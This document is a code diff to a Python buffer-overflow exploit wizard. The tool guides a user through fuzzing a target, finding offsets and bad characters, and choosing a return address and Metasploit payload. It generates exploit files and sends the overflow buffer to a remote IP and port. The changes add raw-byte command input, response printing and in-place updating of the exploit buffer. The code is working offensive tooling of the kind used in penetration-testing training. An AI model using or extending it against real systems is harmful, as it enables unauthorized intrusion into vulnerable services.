@@ -25,6 +25,7 @@ import shutil
 import socket as so
 import subprocess as sub
 from binascii import unhexlify
+from fileinput import FileInput
 
 # -----------------------------------------------------------------------------
 # Global variables and constants
@@ -251,6 +252,7 @@ class BadCharABuffer:
 			print_warning('The buffer with all ascii characters is greater than the originally defined buffer length. '
 						  'Check whether the exploit still runs properly.')
 
+
 selected_buffer = 0
 bad_char_buffer = BadCharCBuffer()
 buf_types = [GenericBuffer(), ESPBuffer(), EAXBuffer(), FixedAddressBuffer()]
@@ -301,13 +303,15 @@ def desc_port():
 def desc_start_command():
 	return ['command', str(start_command), 'no',
 			'Command which needs to be placed before calling the payload. '
-			'Enter with set command "command". Leave empty if not required']
+			'Enter with: set command "command". For raw ASCII input use: set command b"command". '
+			'Leave empty if not required']
 
 
 def desc_end_command():
 	return ['end_command', str(end_command), 'no',
 			'Command which needs to be placed after calling the payload. '
-			'Enter with set end_command "command". Leave empty if not required']
+			'Enter with: set end_command "command". For raw ASCII input use: set command b"command". '
+			'Leave empty if not required']
 
 
 def desc_fuzz_buff_length():
@@ -473,7 +477,8 @@ def step_fuzzing():
 		file = file_name + '.' + file_ext if file_ext else file_name
 		print('\n{} files with increasing size will be generated. The following settings will be used:\n'.format(
 			fuzz_buff_length))
-		settings = [desc_file_ext(), desc_fuzz_buff_length(), desc_fuzz_char(), desc_increase_step(), desc_start_command(), desc_end_command()]
+		settings = [desc_file_ext(), desc_fuzz_buff_length(), desc_fuzz_char(), desc_increase_step(),
+					desc_start_command(), desc_end_command()]
 	elif bo_type == 'remote':
 		# Target IP
 		show_prompt_text('Enter target IP:')
@@ -488,7 +493,7 @@ def step_fuzzing():
 		print('\nA fuzzing file will be generated. The following settings will be used:\n')
 		settings = [desc_target(), desc_port(), desc_fuzz_buff_length(), desc_fuzz_char(),
 					desc_increase_step(), desc_start_command(), desc_end_command()]
-		# Optional: file name, buffer length, increase, start command
+	# Optional: file name, buffer length, increase, start command
 	show_settings(settings)
 	if proceed_ok():
 		if bo_type == 'local':
@@ -530,7 +535,7 @@ def step_pattern():
 			buffer = start_command
 			buffer += f.read().splitlines()[0].encode()
 			buffer += end_command
-			# -----------------------------------------
+		# -----------------------------------------
 		os.unlink(tmp_file)
 		print('The exploit file will be generated. The following settings will be used:\n')
 		if bo_type == 'local':
@@ -618,7 +623,7 @@ def step_offsets():
 		if bo_type == 'local':
 			dump_local_exploit()
 		elif bo_type == 'remote':
-			dump_remote_exploit()
+			update_remote_exploit()
 			run_remote_exploit()
 		print(
 			' Does the EIP show 42424242? If not, something is wrong with the offset and you should repeat the previous steps.')
@@ -650,13 +655,13 @@ def step_badchars():
 		if bo_type == 'local':
 			dump_local_exploit()
 		elif bo_type == 'remote':
-			dump_remote_exploit()
+			update_remote_exploit()
 			run_remote_exploit()
 		print('\n Can you see all Cs when following ESP or EAX in dump (depending on where the Cs are stored)?')
 		print('''{}
 		In Immunity Debugger, you can use mona to find the bad characters. 
 		To do so, do the following before resending the exploit:
-		1. Compare:              !mona compare -f c:\\mona\\<app name> -a <address where Cs should start>
+		1. Compare:              !mona compare -f c:\\mona\\<app name>\\bytearray.bin -a <address where Cs should start>
 		2. Recreate byte array:  !mona bytearray -cpb "{}<new_bad_char>"
 		{}'''.format(GRAY, '\\x' + '\\x'.join(c for c in badchars), FORMAT_END))
 		show_prompt_text('Enter the character (e.g. 00, 0a, 0d) which does not show up or breaks the exploit')
@@ -702,7 +707,7 @@ def step_return():
 	if bo_type == 'local':
 		dump_local_exploit()
 	elif bo_type == 'remote':
-		dump_remote_exploit()
+		update_remote_exploit()
 		run_remote_exploit()
 	# Proceed
 	print(' Check if everything is where it should be. If not, repeat previous steps.')
@@ -757,7 +762,7 @@ def step_payload():
 			if payload_ok and bo_type == 'local':
 				dump_local_exploit()
 			elif payload_ok and bo_type == 'remote':
-				dump_remote_exploit()
+				update_remote_exploit()
 				run_remote_exploit()
 			show_prompt_text('Did your exploit work? If not, try sending a different payload.')
 			show_prompt_text(
@@ -1018,17 +1023,31 @@ def set_option(user_input):
 	elif parameter == 'command':
 		value = user_input.split(' ')[2:]
 		command = ' '.join(v for v in value)
-		command = command.lstrip('"')
-		command = command.rstrip('"')
-		start_command = command.encode()
+		# Handle binary input differently
+		if command.startswith('b"'):
+			command = command.lstrip('b"')
+			command = command.rstrip('"')
+			raw = ''.join(c for c in command.split('\\x'))
+			start_command = unhexlify(raw)
+		else:
+			command = command.lstrip('"')
+			command = command.rstrip('"')
+			start_command = command.encode().replace(b'\\r', b'\r').replace(b'\\n', b'\n').replace(b'\\t', b'\t')
 		# Recalc pattern length
 		pattern_length = pattern_length - len(start_command) - len(end_command)
 	elif parameter == 'end_command':
 		value = user_input.split(' ')[2:]
 		command = ' '.join(v for v in value)
-		command = command.lstrip('"')
-		command = command.rstrip('"')
-		end_command = command.encode().replace(b'\\r', b'\r').replace(b'\\n', b'\n')
+		# Handle binary input differently
+		if command.startswith('b"'):
+			command = command.lstrip('b"')
+			command = command.rstrip('"')
+			raw = ''.join(c for c in command.split('\\x'))
+			end_command = unhexlify(raw)
+		else:
+			command = command.lstrip('"')
+			command = command.rstrip('"')
+			end_command = command.encode().replace(b'\\r', b'\r').replace(b'\\n', b'\n').replace(b'\\t', b'\t')
 		# Recalc pattern length
 		pattern_length = pattern_length - len(start_command) - len(end_command)
 	elif parameter == 'badchars':
@@ -1189,7 +1208,8 @@ def show_help():
 		['set', 'Sets a parameter, examples: set step 3, set target 10.10.10.1'],
 		['show ascii', 'Shows all ASCII characters that are currently allowed in this exploit'],
 		['show options', 'Shows which values are currently set for all parameters'],
-		['show payloads', 'Shows all possible Metasploit payloads based on your settings for platform and architecture'],
+		['show payloads',
+		 'Shows all possible Metasploit payloads based on your settings for platform and architecture'],
 		['show steps', 'Shows all wizard steps and highlights the current step']
 	]
 	dash = '-' * 77
@@ -1327,7 +1347,7 @@ def show_ascii():
 	Shows all ASCII characters in a matrix (helps finding bad chars)
 	"""
 	hexed = char_string.hex()
-	listed = [hexed[i:i+2] for i in range(0, len(hexed), 2)]
+	listed = [hexed[i:i + 2] for i in range(0, len(hexed), 2)]
 	cols = 16
 	lines = ("  ".join(listed[i:i + cols]) for i in range(0, len(listed), cols))
 	print('\n')
@@ -1373,9 +1393,9 @@ def show_prompt_text(text, show_lines=True):
 
 def show_step_banner(title):
 	print(YELLOW)
-	print('~'*60)
+	print('~' * 60)
 	print('  ' + title)
-	print('~'*60)
+	print('~' * 60)
 	print(FORMAT_END)
 
 
@@ -1393,6 +1413,7 @@ def animation(name):
 def threadpool(f, executor=None):
 	def wrap(*args, **kwargs):
 		return (executor or _DEFAULT_POOL).submit(f, *args, **kwargs)
+
 	return wrap
 
 
@@ -1432,10 +1453,12 @@ def send_exploit():
 				return
 			# Connection established: send request
 			try:
+				if s.recv(1024):
+					print_info('Received response:' + str(s.recv(1024)))
 				print_info('Sending evil request with {} bytes'.format(len(buffer)))
 				s.send(buffer)
 				if s.recv(1024):
-					print_info('Received response')
+					print_info('Received response:' + str(s.recv(1024)))
 				print_success('Done')
 			# Stop on timeout
 			except so.timeout:
@@ -1474,10 +1497,13 @@ def send_fuzzing():
 					return
 				# Connection established: send request
 				try:
+					if s.recv(1024):
+						print_info('Received response:' + str(s.recv(1024)))
 					command = start_command + item + end_command
 					print_info('Fuzzing with {} bytes'.format(len(command)))
 					s.send(command)
-					s.recv(1024)
+					if s.recv(1024):
+						print_info('Received response:' + str(s.recv(1024)))
 					print_success('Done')
 				# Stop on timeout
 				except so.timeout:
@@ -1526,20 +1552,23 @@ with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
 		s.settimeout(10)
 		print(' [*] Connecting to', target)
 		connect = s.connect_ex((target, port))
-	
+
 		# Stop script if connection cannot be established
 		if connect != 0:
 			print('[!] Connection failed')
 			exit(1)
-	
+
 		# Connection established: send request
 		try:
+			if s.recv(1024):
+				print('[*] Received response: ' + str(s.recv(1024)))
+
 			print(' [*] Sending evil request with', len(buffer), 'bytes')
 			s.send(buffer)
 			if s.recv(1024):
-				print('[*] Received response')
+				print('[*] Received response: ' + str(s.recv(1024)))
 			print('[*] Done')
-	
+
 		# Stop on timeout
 		except so.timeout:
 			print('[!] Connection failed due to socket timeout.')
@@ -1554,9 +1583,26 @@ with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
 	try:
 		with open(file, 'w') as f:
 			f.write(content)
-		print_success('Created / modified exploit file {}'.format(file))
+		print_success('Created exploit file {}'.format(file))
 	except OSError as ex:
 		print_error('Error while creating the exploit file:\n {}'.format(ex.strerror))
+
+
+def update_remote_exploit():
+	"""
+	Updates only the buffer in an existing exploit file.
+	Manual changes in other parts of the file will be retained.
+	"""
+	try:
+		with FileInput(files=[file], inplace=True) as f:
+			for line in f:
+				line = line.rstrip()
+				if line.startswith('buffer = '):
+					line = 'buffer = {}'.format(buffer)
+				print(line)
+		print_success('Updated buffer in exploit file {}'.format(file))
+	except OSError as ex:
+		print_error('Error while updating the exploit file:\n {}'.format(ex.strerror))
 
 
 def build_fuzz_buffer():
@@ -1566,7 +1612,7 @@ def build_fuzz_buffer():
 	"""
 	counter = increase_step - len(start_command) - len(end_command)
 	while len(fuzz_buffer) <= fuzz_buff_length:
-		fuzz_buffer.append(fuzz_char*counter)
+		fuzz_buffer.append(fuzz_char * counter)
 		counter = counter + increase_step
 
 
@@ -1611,20 +1657,23 @@ for item in fuzz_buffer:
 			s.settimeout(10)
 			print(' [*] Connecting to', target)
 			connect = s.connect_ex((target, port))
-		
+
 			# Stop script if connection cannot be established
 			if connect != 0:
 				print('[!] Connection failed')
 				exit(1)
-		
+
 			# Connection established: send request
 			try:
+				if s.recv(1024):
+					print('[*] Received response: ' + str(s.recv(1024)))
 				command = {cmd} + item + {ecmd}
 				print(' [*] Fuzzing with', len(command), 'bytes')
 				s.send(command)
-				s.recv(1024)
+				if s.recv(1024):
+					print(' [*] Received response: ' + str(s.recv(1024)))
 				print('[*] Done')
-		
+
 			# Stop on timeout
 			except so.timeout:
 				print('[!] Connection failed due to socket timeout.')
@@ -1657,7 +1706,9 @@ if __name__ == '__main__':
 	print_welcome()
 	show_steps()
 	# Walk through steps or let user work freely
-	show_prompt_text('Enter {}start{} to walk through the wizard step by step or make your settings manually.'.format(BOLD, FORMAT_END))
+	show_prompt_text(
+		'Enter {}start{} to walk through the wizard step by step or make your settings manually.'.format(BOLD,
+																										 FORMAT_END))
 	show_prompt_text('Enter {}show help{} to get help.'.format(BOLD, FORMAT_END))
 	start_input = get_input(intro_valid)
 	if start_input == 'start':
